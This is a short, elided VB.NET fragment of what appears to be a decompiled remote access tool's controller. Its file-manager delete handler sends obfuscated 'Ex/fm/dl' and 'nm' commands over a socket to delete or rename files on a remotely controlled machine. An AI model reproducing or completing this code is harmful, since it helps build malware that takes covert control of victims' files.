...
Public Class Manager
    ...
    Private Sub DeleteToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem1.Click
        ...
        Try
            ...
            Do While enumerator.MoveNext
                'Dim current As String = DirectCast(enumerator.Current, String)
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                'current.ToolTipText

                Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "dl", Class7.string_1, Class6.smethod_14(Me.TextBox1.Text & current.Text)}))

                'Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "dl", Class7.string_1, Class6.smethod_14(current.ToolTipText)}))
                ...
                If (current.Text <> "..") Then
                    ...
                    Else
                        ...
                        If (str2.Length > 0) Then
                            Dim cmd As String = String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "nm", Class7.string_1, Class6.smethod_14((current.ToolTipText & "*" & str2 & "*"))})
